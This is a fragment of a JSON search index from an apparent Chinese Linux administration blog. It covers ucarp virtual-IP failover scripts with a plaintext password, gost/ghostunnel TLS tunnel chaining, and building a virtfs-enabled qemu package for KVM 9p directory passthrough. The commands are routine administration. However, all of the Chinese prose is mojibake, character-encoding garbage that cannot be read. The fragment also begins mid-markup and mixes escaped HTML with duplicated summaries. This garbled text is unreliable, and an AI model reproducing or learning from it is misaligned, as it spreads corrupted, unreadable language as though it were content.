class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStop=/bin/sleep 10\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eTimeoutStopSec=30\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eStandardOutput=journal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæ³¨æ„ï¼Œä¸Šé¢æˆ‘ä»¬çš„systemdæ˜¯ç›´æ¥è°ƒç”¨äº†ucarp.shæ¥å¯åŠ¨ï¼Œè¿™æ ·æ›´ç®€å•ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eä¸‰ä¸ªè„šæœ¬ï¼Œæ³¨æ„æƒé™æ˜¯755\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/bash\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.1 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-up.sh \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/sbin/ip addr add ${2}/24 dev ${1}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/sbin/ip neigh flush dev ${1}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-down.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/sbin/ip addr del ${2}/24 dev ${1}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/usr/sbin/arp -d ${2}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /usr/local/bin/ucarp.sh /usr/local/bin/vip-up.sh /usr/local/bin/vip-down.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼Œç¬¬ä¸€å°æœºå™¨å°±é…ç½®å¥½äº†\u003c/p\u003e","title":"ucarpçš„å®‰è£…é…ç½®"},{"content":"ç”¨è¿‡äº†å¥½å‡ ä¸ª tunnel å·¥å…·è½¯ä»¶ï¼Œå„æœ‰é•¿å¤„ã€‚\nghostunnel æ˜¯æ”¯æŒè‡ªå®šä¹‰ tls è¯ä¹¦åŠ å¯†çš„ï¼Œè¿™å›ç”¨ä¸ªæ›´å‰å®³çš„ï¼Œæ”¯æŒå„ç§ä»£ç†é“¾æ¡çš„ï¼Œgost\né¡¹ç›®åœ°å€ï¼šhttps://github.com/ginuerzh/gost\né‡Œé¢çš„æ¦‚å¿µæœ‰ç‚¹æ„æ€ï¼Œå…¶å®å°±ä¸¤æ¡ï¼Œ-L æœ¬åœ°ç›‘å¬ï¼Œ-F é“¾æ¡è½¬å‘ã€‚\næ³¨æ„çš„å°±ä¸€ç‚¹ï¼Œ-F çš„æ—¶å€™å®é™…æ˜¯ä¸€ä¸ªä¸­è½¬æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸­è½¬æœåŠ¡å™¨è¦è½¬å‘çš„è§„åˆ™éœ€è¦åœ¨ -L å‚æ•°é‡ŒæŒ‡å®šã€‚\né‚£ä¹ˆä¸¾ä¸ªå…·ä½“çš„ä¾‹å­ï¼š\nä¸­è½¬æœåŠ¡å™¨å¼€äº†ä¸€ä¸ªæ˜æ–‡ç«¯å£ 9999ï¼Œè¿™ä¸ªç«¯å£è·‘çš„æ˜¯ ghostunnel clientï¼ŒåŠ å¯†æ•°æ®åä¼ åˆ°å¦å¤–ä¸€ä¸ªghostunnel serveræœåŠ¡å™¨ï¼Œç„¶åæ•°æ®æ˜æ–‡ç©¿å‡ºï¼Œè®¿é—®å…·ä½“çš„ç›®çš„ç½‘ç«™çš„ç«¯å£ã€‚\nå®¢æˆ·ç«¯çš„æœåŠ¡å™¨å‘¢æ— å¤–ç½‘è®¿é—®æƒé™ï¼Œéœ€è¦è®¿é—®ä¸­è½¬æœåŠ¡å™¨ 192.168.1.1 çš„ 9999 ç«¯å£ï¼Œç„¶åæ•°æ®é€šè¿‡ ghostunnel åŠ å¯†ç©¿å‡ºåˆ°å¤–ç½‘ã€‚\nä¸­è½¬æœåŠ¡å™¨é…ç½®å¦‚ä¸‹ï¼š\n# ghostunnel ç›‘å¬æœ¬åœ°ç¯å›åœ°å€çš„9999ç«¯å£ï¼ŒTLS åŠ å¯†ç©¿è¶Šåˆ°å¤–ç½‘110.114.5.19:9999ï¼Œç„¶åæ ¹æ®å¤–ç½‘ server é‡Œé¢çš„é…ç½®ï¼Œåˆ°è¾¾æœ€ç»ˆç›®çš„åœ° ip å’Œ ç«¯å£ ghostunnel client --listen localhost:9999 --target 110.114.5.19:9999 --keystore client.pem --cacert ca.pem --unsafe-listen # gost ç›‘å¬æœ¬åœ°ç½‘å¡192.168.1.1çš„9999ç«¯å£ gost-linux-amd64-2.11.1 -L=tls://192.168.1.1:9999 å®¢æˆ·ç«¯é…ç½®å¦‚ä¸‹ï¼š\ngost-linux-amd64-2.11.1 -L=tcp://localhost:9999/localhost:9999 -F=tls://192.168.1.1:9999 è¿™æ ·å®¢æˆ·ç«¯çš„ç¨‹åºï¼Œåªè¦è¿æ¥ localhost:9999 çš„ tcp ç«¯å£ï¼Œå°±å¯ä»¥æ¥åŠ›ä¸­è½¬æœåŠ¡å™¨ç©¿å‡ºå»äº†ã€‚\nä¸Šé¢çš„é…ç½®éå¸¸æ€ªå¼‚å§ï¼Œä»”ç»†è§£é‡Šä¸€ä¸‹ï¼š\nä¸­è½¬æœåŠ¡å™¨å‘¢æœ‰ä¸¤ä¸ªåœ°å€ï¼Œlocalhostçš„ç¯å›åœ°å€ï¼Œä»¥åŠæœ¬åœ°ç½‘å¡192.168.1.1\nlocalhost:9999 æ˜¯ç”¨ ghostunnel åŠ å¯† tcp æµé‡ï¼Œtls ç©¿åˆ°å¤–ç½‘ 110.114.5.19 çš„ 9999 ç«¯å£ï¼Œç„¶åå¤–ç½‘å†è½¬å‘ã€‚\nä¸­è½¬æœåŠ¡å™¨åŒæ—¶ç›‘å¬äº†ä¸€ä¸ª 192.168.1.1:9999 ç«¯å£ tls çš„åŠ å¯†ä»£ç†ç«¯å£ã€‚\nä¸­è½¬æœåŠ¡å™¨çš„éƒ¨åˆ†å°±å®Œäº†ã€‚\nè€Œå®¢æˆ·ç«¯é…ç½® -L = tcp://localhost:9999/localhost:9999\nç¬¬ä¸€ä¸ª localhost:9999 æŒ‡çš„æ˜¯æœ¬æœºçš„åœ°å€ï¼Œç¬¬äºŒä¸ª localhost:9999 æŒ‡çš„æ˜¯ä¸­è½¬æœºä¸Šé¢çš„è½¬å‘åœ°å€ï¼Œè¿™ä¸ªåœ°æ–¹éå¸¸è®©äººè¿·æƒ‘ã€‚\nå¼ºè°ƒä¸€ä¸‹ï¼šä¸­è½¬ä»£ç†çš„è½¬å‘é…ç½®æ˜¯åœ¨å®¢æˆ·ç«¯è®¾ç½®ï¼Œè€Œä¸æ˜¯ä¸­è½¬ä»£ç†ä¸Šè®¾ç½®ã€‚ ç„¶å -F æŒ‡å®šäº†ä¸­è½¬æœåŠ¡å™¨ï¼Œå°±å¯ä»¥äº†ã€‚\næœ€åä¸€ä¸ªè¦æ³¨æ„çš„åœ°æ–¹ï¼Œä»£ç†åè®®æ— è®ºæ˜¯ tls ã€kcp ç­‰ï¼Œéƒ½è‡ªå¸¦ç¼ºçœçš„è¯ä¹¦ï¼Œå¦‚æœä¸æ»¡æ„ï¼Œå¯ä»¥è‡ªå·±æŒ‡å®šçš„ã€‚è¿™ä¸ªå·¥å…·ä¸ç”¨ç‰¹æ„ç”Ÿæˆè¯ä¹¦æ¥ä½¿ç”¨ã€‚\n","permalink":"https://rendoumi.com/posts/20220224-gost_tunnel/","summary":"\u003cp\u003eç”¨è¿‡äº†å¥½å‡ ä¸ª tunnel å·¥å…·è½¯ä»¶ï¼Œå„æœ‰é•¿å¤„ã€‚\u003c/p\u003e\n\u003cp\u003eghostunnel æ˜¯æ”¯æŒè‡ªå®šä¹‰ tls è¯ä¹¦åŠ å¯†çš„ï¼Œè¿™å›ç”¨ä¸ªæ›´å‰å®³çš„ï¼Œæ”¯æŒå„ç§ä»£ç†é“¾æ¡çš„ï¼Œgost\u003c/p\u003e\n\u003cp\u003eé¡¹ç›®åœ°å€ï¼šhttps://github.com/ginuerzh/gost\u003c/p\u003e\n\u003cp\u003eé‡Œé¢çš„æ¦‚å¿µæœ‰ç‚¹æ„æ€ï¼Œå…¶å®å°±ä¸¤æ¡ï¼Œ-L æœ¬åœ°ç›‘å¬ï¼Œ-F é“¾æ¡è½¬å‘ã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„çš„å°±ä¸€ç‚¹ï¼Œ-F çš„æ—¶å€™å®é™…æ˜¯ä¸€ä¸ªä¸­è½¬æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸­è½¬æœåŠ¡å™¨è¦è½¬å‘çš„è§„åˆ™éœ€è¦åœ¨ -L å‚æ•°é‡ŒæŒ‡å®šã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆä¸¾ä¸ªå…·ä½“çš„ä¾‹å­ï¼š\u003c/p\u003e\n\u003cp\u003eä¸­è½¬æœåŠ¡å™¨å¼€äº†ä¸€ä¸ªæ˜æ–‡ç«¯å£ 9999ï¼Œè¿™ä¸ªç«¯å£è·‘çš„æ˜¯ ghostunnel clientï¼ŒåŠ å¯†æ•°æ®åä¼ åˆ°å¦å¤–ä¸€ä¸ªghostunnel serveræœåŠ¡å™¨ï¼Œç„¶åæ•°æ®æ˜æ–‡ç©¿å‡ºï¼Œè®¿é—®å…·ä½“çš„ç›®çš„ç½‘ç«™çš„ç«¯å£ã€‚\u003c/p\u003e\n\u003cp\u003eå®¢æˆ·ç«¯çš„æœåŠ¡å™¨å‘¢æ— å¤–ç½‘è®¿é—®æƒé™ï¼Œéœ€è¦è®¿é—®ä¸­è½¬æœåŠ¡å™¨ 192.168.1.1 çš„ 9999 ç«¯å£ï¼Œç„¶åæ•°æ®é€šè¿‡ ghostunnel åŠ å¯†ç©¿å‡ºåˆ°å¤–ç½‘ã€‚\u003c/p\u003e\n\u003cp\u003eä¸­è½¬æœåŠ¡å™¨é…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ghostunnel ç›‘å¬æœ¬åœ°ç¯å›åœ°å€çš„9999ç«¯å£ï¼ŒTLS åŠ å¯†ç©¿è¶Šåˆ°å¤–ç½‘110.114.5.19:9999ï¼Œç„¶åæ ¹æ®å¤–ç½‘ server é‡Œé¢çš„é…ç½®ï¼Œåˆ°è¾¾æœ€ç»ˆç›®çš„åœ° ip å’Œ ç«¯å£\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eghostunnel client --listen localhost:9999 --target 110.114.5.19:9999 --keystore client.pem --cacert ca.pem --unsafe-listen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# gost ç›‘å¬æœ¬åœ°ç½‘å¡192.168.1.1çš„9999ç«¯å£\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egost-linux-amd64-2.11.1 -L\u003cspan class=\"o\"\u003e=\u003c/span\u003etls://192.168.1.1:9999\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®¢æˆ·ç«¯é…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egost-linux-amd64-2.11.1 -L\u003cspan class=\"o\"\u003e=\u003c/span\u003etcp://localhost:9999/localhost:9999 -F\u003cspan class=\"o\"\u003e=\u003c/span\u003etls://192.168.1.1:9999\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å®¢æˆ·ç«¯çš„ç¨‹åºï¼Œåªè¦è¿æ¥ localhost:9999 çš„ tcp ç«¯å£ï¼Œå°±å¯ä»¥æ¥åŠ›ä¸­è½¬æœåŠ¡å™¨ç©¿å‡ºå»äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸Šé¢çš„é…ç½®éå¸¸æ€ªå¼‚å§ï¼Œä»”ç»†è§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸­è½¬æœåŠ¡å™¨å‘¢æœ‰ä¸¤ä¸ªåœ°å€ï¼Œlocalhostçš„ç¯å›åœ°å€ï¼Œä»¥åŠæœ¬åœ°ç½‘å¡192.168.1.1\u003c/p\u003e\n\u003cp\u003elocalhost:9999 æ˜¯ç”¨ ghostunnel åŠ å¯† tcp æµé‡ï¼Œtls ç©¿åˆ°å¤–ç½‘ 110.114.5.19 çš„ 9999 ç«¯å£ï¼Œç„¶åå¤–ç½‘å†è½¬å‘ã€‚\u003c/p\u003e","title":"gost tunnelçš„ä½¿ç”¨"},{"content":"è¿™ä¸ªéœ€æ±‚ä¹Ÿå¾ˆæœ‰ç‚¹æ„æ€ï¼ŒDBA è¦æ±‚åš MySQL çš„å¸è½½ä»åº“ï¼Œæ•°æ®é‡ä¼šå¾ˆå¤§ï¼Œç¡¬ç›˜ç©ºé—´åæœŸéœ€è¦æ‰©å®¹ï¼Œä½†æ˜¯ cpu åå€’å çš„ä¸å¤šã€‚\nå•ç‹¬ MySQL æ˜¯æ— æ³•é™åˆ¶å…¶ CPU æ ¸ä½¿ç”¨çš„ï¼Œè¿™æ ·çš„è¯ï¼Œæœ€å¥½å°±æ˜¯åšä¸ªè™šæœºæ¥æ§åˆ¶ MySQL æ€» CPU æ ¸æ•°çš„ä½¿ç”¨ï¼Œç„¶åç¡¬ç›˜æ‰©å®¹çš„è¯ï¼Œæ¯”å¦‚è¦æ‹‰ä¼¸è™šæœºçš„é™„åŠ ç¬¬äºŒå—ç¡¬ç›˜ï¼Œå¦‚æœæ˜¯ QEMU æ ¼å¼ï¼Œä¼šèŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œæ‰€ä»¥å¹²è„†æŠŠå®¿ä¸»æœºçš„ç›®å½•ç›´æ¥é€ä¼ è¿›è™šæœºï¼Œä¹‹åå¦‚æœè¦æ‰©å®¹åŠ ç¡¬ç›˜ï¼Œç›´æ¥æŠŠæ–°çš„å¤§ç¡¬ç›˜ mount å‡ºæ¥å†é€è¿›å»å³å¯ï¼Œæ–°æ—§ç¡¬ç›˜æ‹·è´æ•°æ®ä¹Ÿæ¯”æ‹‰ä¼¸è™šæœºç¡¬ç›˜å¿«ã€‚\nCentOS7 ä¸‹çš„åšæ³•å¦‚ä¸‹ï¼š\nä¸¤ä¸ªå¤§å‰æï¼š\nä¸€ã€å®¿ä¸»æœºçš„ KVM qemu ç³»ç»Ÿéœ€è¦ä½¿ç”¨æ–°çš„ rpm åŒ…ï¼Œéœ€è¦ç¼–è¯‘\näºŒã€è™šæœºçš„å†…æ ¸éœ€è¦å‡çº§ï¼Œmount å‘½ä»¤éœ€è¦æ”¯æŒ -t p9 çš„æ–°æ ¼å¼\næˆ‘ä»¬åšå¥½å‡†å¤‡ï¼Œå°±å¯ä»¥å¼€å§‹äº†\nä¸€ã€ç¼–è¯‘å®¿ä¸»æœºçš„qemuæ–°åŒ… ç°åœ¨å·²ç»æ˜¯2022å¹´äº†ï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ–¹å¼ä¹Ÿå‘ç”Ÿå˜åŒ–äº†ï¼Œæœ€ä½³ç¼–è¯‘æ–¹å¼æ˜¯å¹²è„†å¯åŠ¨ä¸€ä¸ª Docker è™šæ‹Ÿæœºï¼Œæ¥ç¼–è¯‘å‡ºæ¥ rpm åŒ…ï¼Œä¹Ÿä¸æ±¡æŸ“ç¯å¢ƒã€‚\né¦–å…ˆå…‹éš†ä¸‹æ¥é¡¹ç›®ï¼š\ngit clone https://github.com/AlekseyChudov/qemu-kvm-virtfs.git cd qemu-kvm-virtfs çœ‹ä¸€ä¸‹æœ€åçš„ build è„šæœ¬ï¼Œæœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦ä¿®æ”¹ï¼š\nç°åœ¨çš„ CentOS æœ€æ–°ç‰ˆæ˜¯ 7.9.2009 ï¼Œè¿™ä¸ªç‰ˆæœ¬æ ‘é‡Œæ˜¯æ²¡æœ‰ qemu çš„ Source Code çš„ï¼Œéœ€è¦ä¿®æ”¹ baseurlï¼Œé™ä½åˆ° 7.8.2003 æ‰æœ‰ Source çš„ repo\nbaseurl=https://mirrors.tripadvisor.com/centos-vault/centos/\\$releasever/virt/Source/kvm-common/ æ”¹æˆï¼š baseurl=https://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/ æ”¹å¥½å build è„šæœ¬å¦‚ä¸‹\n#!/bin/bash set -ex yum -y update yum -y install \\ \u0026#34;@Development Tools\u0026#34; \\ centos-release-qemu-ev \\ glusterfs-api-devel \\ glusterfs-devel \\ iasl \\ kernel-devel \\ libcacard-devel \\ libepoxy-devel \\ mesa-libgbm-devel \\ nss-devel \\ spice-protocol \\ spice-server-devel \\ usbredir-devel cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/yum.repos.d/CentOS-QEMU-EV.repo [centos-qemu-ev-source] name=CentOS-\\$releasever - QEMU EV Sources baseurl=https://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/ gpgcheck=1 enabled=0 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-Virtualization EOF yum-builddep -y qemu-kvm-ev yumdownloader --source qemu-kvm-ev rpm -Uvh qemu-kvm-ev-*.src.rpm sed -i \u0026#39;s/--disable-virtfs/--enable-virtfs/\u0026#39; /root/rpmbuild/SOURCES/build_configure.sh sed -i -e \u0026#39;/^%files -n qemu-kvm-common/,/^$/s/^$/%{_bindir}\\/virtfs-proxy-helper\\n%{_mandir}\\/man1\\/virtfs-proxy-helper.1.gz\\n/\u0026#39; \\ -e \u0026#39;/^%if %{rhev}$/,/^%else$/s/pkgsuffix -ev/pkgsuffix -virtfs/\u0026#39; \\ -e \u0026#39;/%define rhel_rhev_conflicts()/ a Provides: %1-ev = %{epoch}:%{version}-%{release} \\\\\\nObsoletes: %1-ev \u0026lt; %{obsoletes_version} \\\\\u0026#39; \\ /root/rpmbuild/SPECS/qemu-kvm.spec rpmbuild -ba --clean /root/rpmbuild/SPECS/qemu-kvm.spec ç„¶åä¸€å¥è¯æ‰§è¡Œ Buildï¼š\ncd qemu-kvm-virtfs docker run -it --privileged -v \u0026#34;$PWD/rpmbuild:/root/rpmbuild\u0026#34; \\ docker.io/centos:7 /root/rpmbuild/build ä¼šå¾—åˆ°å¦‚ä¸‹çš„åŒ…ï¼Œç‰ˆæœ¬æ˜¯ 2.12.0-44.1.el7_8.1 ï¼š rpmbuild/RPMS/x86_64/qemu-img-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-common-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-tools-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-debuginfo-2.12.0-44.1.el7_8.1.x86_64.rpm rpmbuild/SRPMS/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.src.rpm æˆ‘ä»¬åœ¨å®¿ä¸»æœºä¸Šå®‰è£…æ›¿æ¢æ–°çš„ qemu åŒ…ï¼Œå¹¶é‡å¯ libvirtd\nyum -y install \\ cloud-utils \\ libvirt-client \\ libvirt-daemon-config-network \\ libvirt-daemon-config-nwfilter \\ libvirt-daemon-driver-interface \\ libvirt-daemon-driver-qemu \\ virt-install \\ rpmbuild/RPMS/x86_64/qemu-img-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm \\ rpmbuild/RPMS/x86_64/qemu-kvm-common-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm \\ rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm systemctl restart libvirtd è¿™æ ·å®¿ä¸»æœºå°±å‡†å¤‡å¥½äº†ã€‚\näºŒã€ç”Ÿäº§è™šæœºï¼Œåšå¥½passthrough ç”Ÿäº§è™šæœºçš„æ—¶å€™ï¼Œéœ€è¦åšå¥½å†…å¤–æ–‡ä»¶ç›®å½•çš„ç›´é€šï¼Œå®¿ä¸»æœºç›®å½•æ˜¯ /opt/testï¼Œå¯¹åº”è™šæœºç›®å½•æ˜¯ /test\n\u0026lt;domains ...\u0026gt; ... \u0026lt;devices ...\u0026gt; \u0026lt;filesystem type=\u0026#39;mount\u0026#39; accessmode=\u0026#39;passthrough\u0026#39;\u0026gt; \u0026lt;source dir=\u0026#39;/opt/test\u0026#39;/\u0026gt; \u0026lt;target dir=\u0026#39;/test\u0026#39;/\u0026gt; \u0026lt;/filesystem\u0026gt; \u0026lt;/devices\u0026gt; \u0026lt;/domains\u0026gt; è™šæœºå¯åŠ¨åï¼Œéœ€è¦å‡çº§æ ¸å¿ƒï¼Œæ”¯æŒæ–°çš„ mount é€‰é¡¹\nyum -y update yum -y --enablerepo centosplus install kernel-plus reboot # æŠŠå®¿ä¸»æœºæä¾›çš„ /test ç‚¹ mount å‡ºæ¥ mount -t 9p -o trans=virtio,version=9p2000.L /test /opt/test ä¹Ÿå¯ä»¥æŠŠæŒ‚è½½ç‚¹å†™è¿›è™šæœºçš„ fstabï¼Œä¸‹æ¬¡å°±ä¼šè‡ªåŠ¨ mount äº†\n/test /opt/test 9p trans=virtio,version=9p2000.L,nofail,_netdev,x-mount.mkdir 0 0 ","permalink":"https://rendoumi.com/posts/20220223-kvm_passthrouth/","summary":"\u003cp\u003eè¿™ä¸ªéœ€æ±‚ä¹Ÿå¾ˆæœ‰ç‚¹æ„æ€ï¼ŒDBA è¦æ±‚åš MySQL çš„å¸è½½ä»åº“ï¼Œæ•°æ®é‡ä¼šå¾ˆå¤§ï¼Œç¡¬ç›˜ç©ºé—´åæœŸéœ€è¦æ‰©å®¹ï¼Œä½†æ˜¯ cpu åå€’å çš„ä¸å¤šã€‚\u003c/p\u003e\n\u003cp\u003eå•ç‹¬ MySQL æ˜¯æ— æ³•é™åˆ¶å…¶ CPU æ ¸ä½¿ç”¨çš„ï¼Œè¿™æ ·çš„è¯ï¼Œæœ€å¥½å°±æ˜¯åšä¸ªè™šæœºæ¥æ§åˆ¶ MySQL æ€» CPU æ ¸æ•°çš„ä½¿ç”¨ï¼Œç„¶åç¡¬ç›˜æ‰©å®¹çš„è¯ï¼Œæ¯”å¦‚è¦æ‹‰ä¼¸è™šæœºçš„é™„åŠ ç¬¬äºŒå—ç¡¬ç›˜ï¼Œå¦‚æœæ˜¯ QEMU æ ¼å¼ï¼Œä¼šèŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œæ‰€ä»¥å¹²è„†æŠŠå®¿ä¸»æœºçš„ç›®å½•ç›´æ¥é€ä¼ è¿›è™šæœºï¼Œä¹‹åå¦‚æœè¦æ‰©å®¹åŠ ç¡¬ç›˜ï¼Œç›´æ¥æŠŠæ–°çš„å¤§ç¡¬ç›˜ mount å‡ºæ¥å†é€è¿›å»å³å¯ï¼Œæ–°æ—§ç¡¬ç›˜æ‹·è´æ•°æ®ä¹Ÿæ¯”æ‹‰ä¼¸è™šæœºç¡¬ç›˜å¿«ã€‚\u003c/p\u003e\n\u003cp\u003eCentOS7 ä¸‹çš„åšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸¤ä¸ªå¤§å‰æï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€å®¿ä¸»æœºçš„ KVM qemu ç³»ç»Ÿéœ€è¦ä½¿ç”¨æ–°çš„ rpm åŒ…ï¼Œéœ€è¦ç¼–è¯‘\u003c/p\u003e\n\u003cp\u003eäºŒã€è™šæœºçš„å†…æ ¸éœ€è¦å‡çº§ï¼Œmount å‘½ä»¤éœ€è¦æ”¯æŒ -t p9 çš„æ–°æ ¼å¼\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬åšå¥½å‡†å¤‡ï¼Œå°±å¯ä»¥å¼€å§‹äº†\u003c/p\u003e\n\u003ch2 id=\"ä¸€ç¼–è¯‘å®¿ä¸»æœºçš„qemuæ–°åŒ…\"\u003eä¸€ã€ç¼–è¯‘å®¿ä¸»æœºçš„qemuæ–°åŒ…\u003c/h2\u003e\n\u003cp\u003eç°åœ¨å·²ç»æ˜¯2022å¹´äº†ï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ–¹å¼ä¹Ÿå‘ç”Ÿå˜åŒ–äº†ï¼Œæœ€ä½³ç¼–è¯‘æ–¹å¼æ˜¯å¹²è„†å¯åŠ¨ä¸€ä¸ª Docker è™šæ‹Ÿæœºï¼Œæ¥ç¼–è¯‘å‡ºæ¥ rpm 